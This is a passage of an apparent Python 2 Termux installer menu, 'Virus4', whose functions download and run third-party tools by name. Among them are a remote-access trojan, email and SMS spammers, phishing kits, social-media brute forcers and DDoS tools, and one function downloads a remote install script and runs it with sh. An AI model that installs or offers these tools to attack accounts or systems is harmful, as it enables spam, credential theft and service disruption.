	os.system("mv zones ~")
	print '######'
	backtomenu_option()

def metasploit():
	print '\n###### Installing Metasploit'
	os.system("apt update && apt upgrade")
	os.system("apt install git wget curl")
	os.system("wget https://gist.githubusercontent.com/Gameye98/d31055c2d71f2fa5b1fe8c7e691b998c/raw/09e43daceac3027a1458ba43521d9c6c9795d2cb/msfinstall.sh")
	os.system("mv msfinstall.sh ~;cd ~;sh msfinstall.sh")
	print '###### Done'
	print "###### Type 'msfconsole' to start."
	backtomenu_option()

def commix():
	print '\n###### Installing Commix'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/commixproject/commix')
	os.system('mv commix ~')
	print '###### Done'
	backtomenu_option()

def brutal():
	print '\n###### Installing Brutal'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/Screetsec/Brutal')
	os.system('mv Brutal ~')
	print '###### Done'
	backtomenu_option()

def a_rat():
	print '\n###### Installing A-Rat'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/Xi4u7/A-Rat')
	os.system('mv A-Rat ~')
	print '###### Done'
	backtomenu_option()

def knockmail():
	print '\n###### Installing KnockMail'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install validate_email pyDNS')
	os.system('git clone https://github.com/4w4k3/KnockMail')
	os.system('mv KnockMail ~')
	print '###### Done'
	backtomenu_option()

def spammer_grab():
	print '\n###### Installing Spammer-Grab'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git && python2 -m pip install requests')
	os.system('git clone https://github.com/p4kl0nc4t/spammer-grab')
	os.system('mv spammer-grab ~')
	print '###### Done'
	backtomenu_option()

def hac():
	print '\n###### Installing Hac'
	os.system('apt update && apt upgrade')
	os.system('apt install php git')
	os.system('git clone https://github.com/Cvar1984/Hac')
	os.system('mv Hac ~')
	print '###### Done'
	backtomenu_option()

def spammer_email():
	print '\n###### Installing Spammer-Email'
	os.system("apt update && apt upgrade")
	os.system("apt install git python2 && python2 -m pip install argparse requests")
	os.system("git clone https://github.com/p4kl0nc4t/Spammer-Email")
	os.system("mv Spammer-Email ~")
	print '###### Done'
	backtomenu_option()

def rang3r():
	print '\n###### Installing Rang3r'
	os.system("apt update && apt upgrade")
	os.system("apt install git python2 && python2 -m pip install optparse termcolor")
	os.system("git clone https://github.com/floriankunushevci/rang3r")
	os.system("mv rang3r ~")
	print '###### Done'
	backtomenu_option()

def sh33ll():
	print '\n###### Installing SH33LL'
	os.system("apt update && apt upgrade")
	os.system("apt install git python2")
	os.system("git clone https://github.com/LOoLzeC/SH33LL")
	os.system("mv SH33LL ~")
	print '###### Done'
	backtomenu_option()

def social():
	print '\n###### Installing Social-Engineering'
	os.system("apt update && apt upgrade")
	os.system("apt install python2 perl")
	os.system("git clone https://github.com/LOoLzeC/social-engineering")
	os.system("mv social-engineering ~")
	print '###### Done'
	backtomenu_option()

def spiderbot():
	print '\n###### Installing SpiderBot'
	os.system("apt update && apt upgrade")
	os.system("apt install git php")
	os.system("git clone https://github.com/Cvar1984/SpiderBot")
	os.system("mv SpiderBot ~")
	print '###### Done'
	backtomenu_option()

def ngrok():
	print '\n###### Installing Ngrok'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/themastersunil/ngrok')
	os.system('mv ngrok ~')
	print '###### Done'
	backtomenu_option()

def sudo():
	print '\n###### Installing sudo'
	os.system('apt update && apt upgrade')
	os.system('apt install ncurses-utils git')
	os.system('git clone https://github.com/st42/termux-sudo')
	os.system('mv termux-sudo ~ && cd ~/termux-sudo && chmod 777 *')
	os.system('cat sudo > /data/data/com.termux/files/usr/bin/sudo')
	os.system('chmod 700 /data/data/com.termux/files/usr/bin/sudo')
	print '###### Done'
	backtomenu_option()

def ubuntu():
	print '\n###### Installing Ubuntu'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/Neo-Oli/termux-ubuntu')
	os.system('mv termux-ubuntu ~ && cd ~/termux-ubuntu && bash ubuntu.sh')
	print '###### Done'
	backtomenu_option()

def fedora():
	print '\n###### Installing Fedora'
	os.system('apt update && apt upgrade')
	os.system('apt install wget git')
	os.system('wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh')
	os.system('mv termux-fedora.sh ~')
	print '###### Done'
	backtomenu_option()

def nethunter():
	print '\n###### Installing Kali NetHunter'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/Hax4us/Nethunter-In-Termux')
	os.system('mv Nethunter-In-Termux ~')
	print '###### Done'
	backtomenu_option()

def blackbox():
	print '\n###### Installing BlackBox'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git && python2 -m pip install optparse passlib')
	os.system('git clone https://github.com/jothatron/blackbox')
	os.system('mv blackbox ~')
	print '###### Done'
	backtomenu_option()

def xattacker():
	print '\n###### Installing XAttacker'
	os.system('apt update && apt upgrade')
	os.system('apt install git perl')
	os.system('cpnm install HTTP::Request')
	os.system('cpnm install LWP::Useragent')
	os.system('git clone https://github.com/Moham3dRiahi/XAttacker')
	os.system('mv XAttacker ~')
	print '###### Done'
	backtomenu_option()

def vcrt():
	print '\n###### Installing VCRT'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/LOoLzeC/Evil-create-framework')
	os.system('mv Evil-create-framework ~')
	print '###### Done'
	backtomenu_option()

def socfish():
	print '\n###### Installing SocialFish'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git && python2 -m pip install wget')
	os.system('git clone https://github.com/UndeadSec/SocialFish')
	os.system('mv SocialFish ~')
	print '###### Done'
	backtomenu_option()

def ecode():
	print '\n###### Installing ECode'
	os.system('apt update && apt upgrade')
	os.system('apt install php git')
	os.system('git clone https://github.com/Cvar1984/Ecode')
	os.system('mv Ecode ~')
	print '###### Done'
	backtomenu_option()

def hashzer():
	print '\n###### Installing Hashzer'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/Anb3rSecID/Hashzer')
	os.system('mv Hashzer ~')
	print '###### Done'
	backtomenu_option()

def xsstrike():
	print '\n###### Installing XSStrike'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install fuzzywuzzy prettytable mechanize HTMLParser')
	os.system('git clone https://github.com/UltimateHackers/XSStrike')
	os.system('mv XSStrike ~')
	print '###### Done'
	backtomenu_option()

def breacher():
	print '\n###### Installing Breacher'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests argparse')
	os.system('git clone https://github.com/UltimateHackers/Breacher')
	os.system('mv Breacher ~')
	print '###### Done'
	backtomenu_option()

def stylemux():
	print '\n###### Installing Termux-Styling'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/BagazMukti/Termux-Styling-Shell-Script')
	os.system('mv Termux-Styling-Shell-Script ~')
	print '###### Done'
	backtomenu_option()

def txtool():
	print '\n###### Installing TXTool'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 nmap php curl')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/kuburan/txtool')
	os.system('mv txtool ~')
	print '###### Done'
	backtomenu_option()

def passgencvar():
	print '\n###### Installing PassGen'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone https://github.com/Cvar1984/PassGen')
	os.system('mv PassGen ~')
	print '###### Done'
	backtomenu_option()

def owscan():
	print '\n###### Installing OWScan'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone https://github.com/Gameye98/OWScan')
	os.system('mv OWScan ~')
	print '###### Done'
	backtomenu_option()

def sanlen():
	print '\n###### Installing santet-online'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install requests')
	os.system('git clone https://github.com/Gameye98/santet-online')
	os.system('mv santet-online ~')
	print '###### Done'
	backtomenu_option()

def spazsms():
	print '\n###### Installing SpazSMS'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install requests')
	os.system('git clone https://github.com/Gameye98/SpazSMS')
	os.system('mv SpazSMS ~')
	print '###### Done'
	backtomenu_option()

def hasher():
	print '\n###### Installing Hasher'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install passlib binascii progressbar')
	os.system('git clone https://github.com/ciku370/hasher')
	os.system('mv hasher ~')
	print '###### Done'
	backtomenu_option()

def hashgenerator():
	print '\n###### Installing Hash-Generator'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install passlib progressbar')
	os.system('git clone https://github.com/ciku370/hash-generator')
	os.system('mv hash-generator ~')
	print '###### Done'
	backtomenu_option()

def kodork():
	print '\n###### Installing ko-dork'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install urllib2')
	os.system('git clone https://github.com/ciku370/ko-dork')
	os.system('mv ko-dork ~')
	print '###### Done'
	backtomenu_option()

def snitch():
	print '\n###### Installing snitch'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/Smaash/snitch')
	os.system('mv snitch ~')
	print '###### Done'
	backtomenu_option()

def osif():
	print '\n###### Installing OSIF'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/ciku370/OSIF')
	os.system('mv OSIF ~')
	print '###### Done'
	backtomenu_option()

def nk26():
	print '\n###### Installing nk26'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone ')
	os.system('mv nk26 ~')
	print '###### Done'
	backtomenu_option()

def devploit():
	print '\n###### Installing Devploit'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git && python2 -m pip install urllib2')
	os.system('git clone https://github.com/joker25000/Devploit')
	os.system('mv Devploit ~')
	print '###### Done'
	backtomenu_option()

def hasherdotid():
	print '\n###### Installing Hasherdotid'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/galauerscrew/hasherdotid')
	os.system('mv hasherdotid ~')
	print '###### Done'
	backtomenu_option()

def namechk():
	print '\n###### Installing Namechk'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/HA71/Namechk')
	os.system('mv Namechk ~')
	print '###### Done'
	backtomenu_option()

def xlPy():
	print '\n###### Installing xl-py'
	os.system('apt update && apt upgrade')
	os.system('apt install python git')
	os.system('git clone https://github.com/albertoanggi/xl-py')
	os.system('mv xl-py ~')
	print '###### Done'
	backtomenu_option()

def beanshell():
	print '\n###### Installing Beanshell'
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://github.com/amsitlab/amsitlab.github.io/raw/master/dists/termux/amsitlab/binary-all/beanshell_2.04_all.deb')
	os.system('dpkg -i beanshell_2.04_all.deb')
	os.system('rm beanshell_2.04_all.deb')
	print '###### Done'
	print "###### Type 'bsh' to start."
	backtomenu_option()

def msfpg():
	print '\n###### Installing MSF-Pg'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/haxzsadik/MSF-Pg')
	os.system('mv MSF-Pg ~')
	print "###### Done"
	backtomenu_option()

def crunch():
	print '\n###### Installing Crunch'
	os.system('apt update && apt upgrade')
	os.system('apt install unstable-repo')
	os.system('apt install crunch')
	print "###### Done"
	print "###### Type 'crunch' to start."
	backtomenu_option()

def webconn():
	print '\n###### Installing WebConn'
	os.system('apt update && apt upgrade')
	os.system('apt install python git')
	os.system('git clone https://github.com/SkyKnight-Team/WebConn')
	os.system('mv WebConn ~')
	print "###### Done"
	backtomenu_option()

def binploit():
	print '\n###### Installing Binary Exploitation'
	os.system('apt update && apt upgrade')
	os.system('apt install gdb radare2 ired ddrescue bin-utils yasm strace ltrace cdb hexcurse memcached llvmdb')
	print "###### Done"
	print "###### Tutorial: https://youtu.be/3NTXFUxcKPc"
	backtomenu_option()

def textr():
	print '\n###### Installing Textr'
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://raw.githubusercontent.com/amsitlab/textr/master/textr_1.0_all.deb')
	os.system('dpkg -i textr_1.0_all.deb')
	os.system('rm textr_1.0_all.deb')
	print '###### Done'
	print "###### Type 'textr' to start."
	backtomenu_option()

def apsca():
	print '\n###### Installing ApSca'
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://raw.githubusercontent.com/BlackHoleSecurity/apsca/master/apsca_0.1_all.deb')
	os.system('dpkg -i apsca_0.1_all.deb')
	os.system('rm apsca_0.1_all.deb')
	print '###### Done'
	print "###### Type 'apsca' to start."
	backtomenu_option()

def amox():
	print '\n###### Installing amox'
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://gitlab.com/dtlily/amox/raw/master/amox_1.0_all.deb')
	os.system('dpkg -i amox_1.0_all.deb')
	os.system('rm amox_1.0_all.deb')
	print '###### Done'
	print "###### Type 'amox' to start."
	backtomenu_option()

def fade():
	print '\n###### Installing FaDe'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install requests')
	os.system('git clone https://github.com/Gameye98/FaDe')
	os.system('mv FaDe ~')
	print '###### Done'
	backtomenu_option()

def ginf():
	print '\n###### Installing GINF'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone https://github.com/Gameye98/GINF')
	os.system('mv GINF ~')
	print '###### Done'
	backtomenu_option()

def auxile():
	print '\n###### Installing AUXILE'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install requests bs4 pexpect')
	os.system('git clone https://github.com/CiKu370/AUXILE')
	os.system('mv AUXILE ~')
	print '###### Done'
	backtomenu_option()

def inther():
	print '\n###### Installing inther'
	os.system('apt update && apt upgrade')
	os.system('apt install git ruby')
	os.system('git clone https://github.com/Gameye98/inther')
	os.system('mv inther ~')
	print '###### Done'
	backtomenu_option()

def hpb():
	print '\n###### Installing HPB'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://raw.githubusercontent.com/Cvar1984/HPB/master/html_0.1_all.deb')
	os.system('dpkg -i html_0.1_all.deb')
	os.system('rm html_0.1_all.deb')
	print '###### Done'
	print "###### Type 'hpb' to start."
	backtomenu_option()

def fmbrute():
	print '\n###### Installing FMBrute'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python && python -m pip install requests')
	os.system('git clone https://github.com/BlackHoleSecurity/FMBrute')
	os.system('mv FMBrute ~')
	print '###### Done'
	backtomenu_option()

def hashid():
	print '\n###### Installing HashID'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install python2 && python2 -m pip install hashid')
	print "###### Done"
	print "###### Type 'hashid -h' to show usage of hashid"
	backtomenu_option()

def gpstr():
	print '\n###### Installing GPS Tracking'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install php git')
	os.system('git clone https://github.com/indosecid/gps_tracking')
	os.system('mv gps_tracking ~')
	print "###### Done"
	backtomenu_option()

def pret():
	print '\n###### Installing PRET'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install python2 imagemagick git')
	os.system('python2 -m pip install colorama pysnmp')
	os.system('git clone https://github.com/RUB-NDS/PRET')
	os.system('mv PRET ~')
	print "###### Done"
	backtomenu_option()
	
def autovisitor():
	print '\n###### Installing AutoVisitor'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git curl')
	os.system('git clone https://github.com/wannabeee/AutoVisitor')
	os.system('mv AutoVisitor ~')
	print "###### Done"
	backtomenu_option()

def atlas():
	print '\n###### Installing Atlas'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 && python2 -m pip install urllib2')
	os.system('git clone https://github.com/m4ll0k/Atlas')
	os.system('mv Atlas ~')
	print "###### Done"
	backtomenu_option()

def hashcat():
	print '\n###### Installing Hashcat'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install unstable-repo')
	os.system('apt install hashcat')
	print "###### Done"
	print "###### Type 'hashcat' to start."
	backtomenu_option()

def liteotp():
	print '\n###### Installing LiteOTP'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install php wget')
	os.system('wget https://raw.githubusercontent.com/Cvar1984/LiteOTP/master/build/main.phar -O $PREFIX/bin/lite')
	print "###### Done"
	print "###### Type 'lite' to start."
	backtomenu_option()

def fbbrutex():
	print '\n###### Installing FBBrute'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python && python -m pip install requests')
	os.system('git clone https://github.com/Gameye98/FBBrute')
	os.system('mv FBBrute ~')
	print '###### Done'
	backtomenu_option()

def fim():
	print '\n###### Installing fim'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python && python -m pip install requests bs4')
	os.system('git clone https://github.com/karjok/fim')
	os.system('mv fim ~')
	print '###### Done'
	backtomenu_option()

def rshell():
	print '\n###### Installing RShell'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python && python -m pip install colorama')
	os.system('git clone https://github.com/Jishu-Epic/RShell')
	os.system('mv RShell ~')
	print '###### Done'
	backtomenu_option()

def termpyter():
	print '\n###### Installing TermPyter'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python')
	os.system('git clone https://github.com/Jishu-Epic/TermPyter')
	os.system('mv TermPyter ~')
	print '###### Done'
	backtomenu_option()

def maxsubdofinder():
	print '\n###### Installing MaxSubdoFinder'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/maxteroit/MaxSubdoFinder')
	os.system('mv MaxSubdoFinder ~')
	print '###### Done'
	backtomenu_option()

def jadx():
	print '\n###### Installing jadx'
	os.system("cd")
	os.system('apt update && apt upgrade')
	os.system('apt install dpkg wget')
	os.system('wget https://github.com/Lexiie/Termux-Jadx/blob/master/jadx-0.6.1_all.deb?raw=true')
	os.system('dpkg -i jadx-0.6.1_all.deb?raw=true')
	os.system('rm -rf jadx-0.6.1_all.deb?raw=true')
	print '###### Done'
	backtomenu_option()

def information_gathering():
	    
	        print red +"                                          [0]back"
	        print ""
	        time.sleep(0.05)
	        print cyan +"\n    [01]download Nmap"
	        time.sleep(0.05)
	        print cyan +"    [02]download Red Hawk"
	        time.sleep(0.05)
	        print cyan +"    [03]download D-Tect"
	        time.sleep(0.05)
	        print cyan +"    [04]download sqlmap"
	        time.sleep(0.05)
                print cyan +"    [05]download Infoga"
	        time.sleep(0.05)
	        print cyan +"    [06]download ReconDog"
	        time.sleep(0.05)
		print cyan +"    [07]download AndroZenmap"
		time.sleep(0.05)
		print cyan +"    [08]download sqlmate"
		time.sleep(0.05)
		print cyan +"    [09]download AstraNmap"
		time.sleep(0.05)
		print cyan +"    [10]download WTF"
		time.sleep(0.05)
		print cyan +"    [11]download Easymap"
		time.sleep(0.05)
		print cyan +"    [12]download BlackBox"
		time.sleep(0.05)
		print cyan +"    [13]download XD3v"
		time.sleep(0.05)
		print cyan +"    [14]download Crips"
		time.sleep(0.05)
		print cyan +"    [15]download SIR"
		time.sleep(0.05)
		print cyan +"    [16]download EvilURL"
		time.sleep(0.05)
		print cyan +"    [17]download Striker"
		time.sleep(0.05)
		print cyan +"    [18]download Xshell"
		time.sleep(0.05)
		print cyan +"    [19]download OWScan"
		time.sleep(0.05)
		print cyan +"    [20]download OSIF"
		time.sleep(0.05)
		print cyan +"    [21]download Devploit"
		time.sleep(0.05)
		print cyan +"    [22]download Namechk"
		time.sleep(0.05)
		print cyan +"    [23]download AUXILE"
		time.sleep(0.05)
		print cyan +"    [24]download inther"
		time.sleep(0.05)
		print cyan +"    [25]download GINF"
		time.sleep(0.05)
		print cyan +"    [26]download GPS Tracking"
		time.sleep(0.05)
		print cyan +"    [27]download ASU"
		time.sleep(0.05)
		print cyan +"    [28]download fim"
		time.sleep(0.05)
		print cyan +"    [29]download MaxSubdoFinder\n"
		time.sleep(0.05)
		print ""
		time.sleep(0.05)
		print ""
		time.sleep(0.05)
		print ""
		time.sleep(0.05)
		nember =raw_input("Virus4(" + red + "download/information_gathering"+ cyan + ") > ")
		if nember == '1' or nember == '01' :
			nmap()
		elif nember == '2' or nember == '02' :
			red_hawk()
                elif nember == '3' or nember == '03' :
			dtect()
		elif nember == '4' or nember == '04' :
		        sqlmap()
		elif nember == '5' or nember == '05' :
			infoga()
		elif nember == '6' or nember == '06' :
			reconDog()
	        elif nember == '7' or nember == '07' :
			androZenmap()
		elif nember == '8' or nember == '08' :
			sqlmate()
		elif nember == '9' or nember == '09' :
			astraNmap()
		elif nember == '10' :
			wtf()
	        elif nember == '11' :
			easyMap()
		elif nember == '12' :
			blackbox()
		elif nember == '13' :
			xd3v()
		elif nember == '14' :
			crips()
	        elif nember == '15' :
			sir()
		elif nember == '16' :
			evilURL()
		elif nember == '17' :
			striker()
		elif nember == '18' :
			xshell()
	        elif nember == '19' :
			owscan()
		elif nember == '20' :
		        osif()
		elif nember == '21' :
		        devploit()
                elif nember == '22' :
                        namechk()
                elif nember == '23' :
                        auxile()
                elif nember == '24' :
                        inther()
                elif nember == '25' :
                        ginf()
                elif nember == '26' :
                        gpstr()
                elif nember == '27' :
                        asu()
                elif nember == '28' :
                        fim()
		elif nember == '29' :
			maxsubdofinder()
		elif nember == '0' or nember == '00' :
			download()
		else :
			error()
		        information_gathering()

def vulnerability_scanner():
    print red +"                                          [0]back"
    time.sleep(0.05)
    print ""
    time.sleep(0.05)
    print cyan +"\n    [01]download Nmap"
    time.sleep(0.05)
    print cyan +"    [02]download AndroZenmap"
    time.sleep(0.05)
    print cyan +"    [03]download AstraNmap"
    time.sleep(0.05)
    print cyan +"    [04]download Easymap"
    time.sleep(0.05)
    print cyan +"    [05]download Red Hawk"
    time.sleep(0.05)
    print cyan +"    [06]download D-Tect"
    time.sleep(0.05)
    print cyan +"    [07]download Damn Small SQLi Scanner"
    time.sleep(0.05)
    print cyan +"    [08]download SQLiv"
    time.sleep(0.05)
    print cyan +"    [09]download sqlmap"
    time.sleep(0.05)
    print cyan +"    [10]download sqlscan"
    time.sleep(0.05)
    print cyan +"    [11]download Wordpresscan"
    time.sleep(0.05)
    print cyan +"    [12]download WPScan"
    time.sleep(0.05)
    print cyan +"    [13]download sqlmate"
    time.sleep(0.05)
    print cyan +"    [14]download wordpresscan"
    time.sleep(0.05)
    print cyan +"    [15]download WTF"
    time.sleep(0.05)
    print cyan +"    [16]download Rang3r"
    time.sleep(0.05)
    print cyan +"    [17]download Striker"
    time.sleep(0.05)
    print cyan +"    [18]download Routersploit"
    time.sleep(0.05)
    print cyan +"    [19]download Xshell"
    time.sleep(0.05)
    print cyan +"    [20]download SH33LL"
    time.sleep(0.05)
    print cyan +"    [21]download BlackBox"
    time.sleep(0.05)
    print cyan +"    [22]download XAttacker"
    time.sleep(0.05)
    print cyan +"    [23]downoad OWScan\n"
    time.sleep(0.05)
    print ""
    time.sleep(0.05)
    print ""
    time.sleep(0.05)
    print ""
    time.sleep(0.05)
    nember =raw_input("Virus4(" + red + "download/vulnerability_scanner"+ cyan + ") > ")
    if nember == '1' or nember == '01' :
          nmap()
    elif nember == '2' or nember == '02' :
          androZenmap()
    elif nember == '3' or nember == '03' :
          astraNmap()
    elif nember == '4' or nember == '04' :
          easyMap()
    elif nember == '5' or nember == '05' :
          red_hawk()
    elif nember == '6' or nember == '06' :
          dtect()
    elif nember == '7' or nember == '07' :
          dsss()
    elif nember == '8' or nember == '08' :
          sqliv()
    elif nember == '9' or nember == '09' :
          sqlmap()
    elif nember == '10' :
          sqlscan()
    elif nember == '11' :
          wordpreSScan()
    elif nember == '12' :
          wpscan()
    elif nember == '13' :
          sqlmate()
    elif nember == '14' :
          wordpresscan()
    elif nember == '15' :
          wtf()
    elif nember == '16' :
          rang3r()
    elif nember == '17' :
          striker()
    elif nember == '18' :
          routersploit()
    elif nember == '19' :
          xshell()
    elif nember == '20' :
          sh33ll()
    elif nember == '21' :
          blackbox()
    elif nember == '22' :
          xattacker()
    elif nember == '23' :
          owscan()
    elif nember == '0' or nember == '00' :
          download()
    else :
          error()
          vulnerability_scanner()
def stress_testing():
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ""
 time.sleep(0.05)
 print cyan +"\n    [01]download Torshammer"
 time.sleep(0.05)
 print cyan +"    [02]download Slowloris"
 time.sleep(0.05)
 print cyan +"    [03]download Fl00d & Fl00d2"
 time.sleep(0.05)
 print cyan +"    [04]download GoldenEye"
 time.sleep(0.05)
 print cyan +"    [05]download Xerxes"
 time.sleep(0.05)
 print cyan +"    [06]download Planetwork-DDOS"
 time.sleep(0.05)
 print cyan +"    [07]download Hydra"
 time.sleep(0.05)
 print cyan +"    [08]download Black Hydra"
 time.sleep(0.05)
 print cyan +"    [09]download Xshell"
 time.sleep(0.05)
 print cyan +"    [10]download santet-online\n"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "download/stress_testing"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      torshammer()
 elif nember == '2' or nember == '02' :
      slowloris()
 elif nember == '3' or nember == '03' :
      fl00d12()
 elif nember == '4' or nember == '04' :
      goldeneye()
 elif nember == '5' or nember == '05' :
      xerxes()
 elif nember == '6' or nember == '06' :
      planetwork_ddos()
 elif nember == '7' or nember == '07' :
      hydra()
 elif nember == '8' or nember == '08' :
      black_hydra()
 elif nember == '9' or nember == '09' :
      xshell()
 elif nember == '10' :
      sanlen()
 elif nember == '0' or nember == '00' :
      download()
 else :
      error()
      stress_testing()


def password_attacks():
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +"\n    [01]download Hydra"
 time.sleep(0.05)
 print cyan +"    [02]download FMBrute"
 time.sleep(0.05)
 print cyan +"    [03]download HashID"
 time.sleep(0.05)
 print cyan +"    [04]download Facebook Brute Force 3"
 time.sleep(0.05)
 print cyan +"    [06]download Hash Buster"
 time.sleep(0.05)
 print cyan +"    [07]download FBBrute"
 time.sleep(0.05)
 print cyan +"    [08]download Cupp"
 time.sleep(0.05)
 print cyan +"    [09]download InstaHack"
 time.sleep(0.05)
 print cyan +"    [10]download Indonesian Wordlist"
 time.sleep(0.05)
 print cyan +"    [11]download Xshell"
 time.sleep(0.05)
 print cyan +"    [12]download Social-Engineering"
 time.sleep(0.05)
 print cyan +"    [13]download BlackBox"
 time.sleep(0.05)
 print cyan +"    [14]download Hashzer"
 time.sleep(0.05)
 print cyan +"    [15]download Hasher"
 time.sleep(0.05)
 print cyan +"    [16]download Hash-Generator"
 time.sleep(0.05)
 print cyan +"    [17]download nk26"
 time.sleep(0.05)
 print cyan +"    [18]download Hasherdotid"
 time.sleep(0.05)
 print cyan +"    [19]download Crunch"
 time.sleep(0.05)
 print cyan +"    [20]download Hashcat"
 time.sleep(0.05)
 print cyan +"    [21]download ASU\n"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "download/password_attacks"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      hydra()
 elif nember == '2' or nember == '02' :
      fmbrute()
 elif nember == '3' or nember == '03' :
      hashid()
 elif nember == '4' or nember == '04' :
      fbBrute()
 elif nember == '5' or nember == '05' :
      black_hydra()
 elif nember == '6' or nember == '06' :
      hash_buster()
 elif nember == '7' or nember == '07' :
      fbbrutex()
 elif nember == '8' or nember == '08' :
      cupp()
 elif nember == '9' or nember == '09' :
      instaHack()
 elif nember == '10' :
      indonesian_wordlist()
 elif nember == '11' :
      xshell()
 elif nember == '12' :
      social()
 elif nember == '13' :
      blackbox()
 elif nember == '14' :
      hashzer()
 elif nember == '15' :
      hasher()
 elif nember == '16' :
      hashgenerator()
 elif nember == '17' :
      nk26()
 elif nember == '18' :
      hasherdotid()
 elif nember == '19' :
      crunch()
 elif nember == '20' :
	  hashcat()
 elif nember == '21' :
      asu()
 elif nember == '0' or nember == '00' :
      download()
 else :
      error()
      password_attacks()
 
def web_hacking():
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +"\n    [01]download sqlmap"
 time.sleep(0.05)
 print cyan +"    [02]download Webdav"
 time.sleep(0.05)
 print cyan +"    [03]download xGans"
 time.sleep(0.05)
 print cyan +"    [04]download Webdav Mass Exploit"
 time.sleep(0.05)
 print cyan +"    [05]download WPSploit"
 time.sleep(0.05)
 print cyan +"    [06]download sqldump"
 time.sleep(0.05)
 print cyan +"    [07]download Websploit"
 time.sleep(0.05)
 print cyan +"    [08]download sqlmate"
 time.sleep(0.05)
 print cyan +"    [09]download sqlokmed"
 time.sleep(0.05)
 print cyan +"    [10]download zones"
 time.sleep(0.05)
 print cyan +"    [11]download Xshell"
 time.sleep(0.05)
 print cyan +"    [12]download SH33LL"
 time.sleep(0.05)
 print cyan +"    [13]download XAttacker"
 time.sleep(0.05)
 print cyan +"    [14]download XSStrike"
 time.sleep(0.05)
 print cyan +"    [15]download Breacher"
 time.sleep(0.05)
 print cyan +"    [16]download OWScan"
 time.sleep(0.05)
 print cyan +"    [17]download ko-dork"
 time.sleep(0.05)
 print cyan +"    [18]download ApSca"
 time.sleep(0.05)
 print cyan +"    [19]download amox"
 time.sleep(0.05)
 print cyan +"    [20]download FaDe"
 time.sleep(0.05)
 print cyan +"    [21]download AUXILE"
 time.sleep(0.05)
 print cyan +"    [22]download HPB"
 time.sleep(0.05)
